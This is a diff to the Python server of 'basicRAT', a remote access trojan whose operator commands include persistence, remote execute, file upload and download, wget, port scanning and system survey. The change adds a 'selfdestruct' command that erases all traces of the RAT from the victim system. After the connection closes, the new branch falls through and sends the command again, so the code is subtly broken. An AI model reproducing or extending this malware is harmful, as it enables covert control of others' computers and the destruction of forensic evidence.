@@ -40,13 +40,14 @@ kill                - Kill the client connection.
 persistence         - Apply persistence mechanism.
 quit                - Exit the server and end all client connections.
 scan <ip>           - Scan top 25 ports on a single host.
+selfdestruct        - Remove all traces of the RAT from the target system.
 survey              - Run a system survey.
 unzip <file>        - Unzip a file.
 upload <files>      - Upload files(s).
 wget <url>          - Download a file from the web.'''
 COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
-             'persistence', 'quit', 'scan', 'survey', 'unzip', 'upload',
-             'wget' ]
+             'persistence', 'quit', 'scan', 'selfdestruct', 'survey', 'unzip',
+             'upload', 'wget' ]
 
 
 class Server(threading.Thread):
@@ -91,11 +92,23 @@ class ClientConnection(common.Client):
             print 'Error: Client not connected.'
             return
 
+        # seperate prompt into command and action
+        cmd, _, action = prompt.partition(' ')
+
+        # selfdestruct rat
+        if cmd == 'selfdestruct':
+            quit_option = raw_input('Remove all traces of basicRAT from the ' \
+                                    'target system (y/N)? ')
+            if len(quit_option) and quit_option[0].lower() == 'y':
+                print 'Running selfdestruct...'
+                self.sendGCM(prompt)
+                self.conn.close()
+            else:
+                return
+
         # send prompt to client
         self.sendGCM(prompt)
         self.conn.settimeout(1)
-
-        cmd, _, action = prompt.partition(' ')
 
         # kill client connection
         if cmd == 'kill':
